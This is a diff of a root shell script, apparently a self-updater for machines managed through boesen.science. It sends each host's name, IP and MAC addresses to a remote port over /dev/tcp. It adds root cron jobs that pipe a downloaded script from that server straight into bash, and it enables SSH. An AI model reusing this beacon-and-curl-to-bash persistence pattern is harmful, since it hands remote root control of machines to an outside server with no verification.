@@ -7,24 +7,27 @@ else
 	date +"%H" > /tmp/last
 fi
 
-IP=`hostname -I | sed 's/ *$//'`
-MAC=`cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//'`
+HOSTNAME=$(hostname)
+IP=$(hostname -I | sed 's/ *$//')
+MAC=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')
+
+INFO="$HOSTNAME $IP $MAC"
 
 SERVER="boesen.science"
 PORT=2043
 
-if [[ $(< /tmp/ip) != "$IP" ]]; then
-	printf "$IP" > /tmp/ip
+rm /tmp/ip
 
-	exec 3<>/dev/tcp/$SERVER/$PORT
-	printf "UPDATE: $MAC $IP" >&3
+if [[ $(< /etc/info) != "$INFO" ]]; then
+	printf "$INFO" > /etc/info
 
-	cat <&3
+	printf "UPDATE: $INFO\0" >/dev/tcp/$SERVER/$PORT
 fi
 
 grep -v "boesen.science" /var/spool/cron/crontabs/root > /tmp/crontab; mv /tmp/crontab /var/spool/crontabs/root
 echo '*/20 * * * * curl -L boesen.science:2042/linux/update.sh |bash' >> /var/spool/crontabs/root
-sudo su -c "printf '#\!/bin/bash\ncurl -L boesen.science:2042/linux/update.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
+
+printf '#\!/bin/bash\ncurl -L boesen.science:2042/linux/update.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update
 
 systemctl start ssh.service
 systemctl enable ssh.service
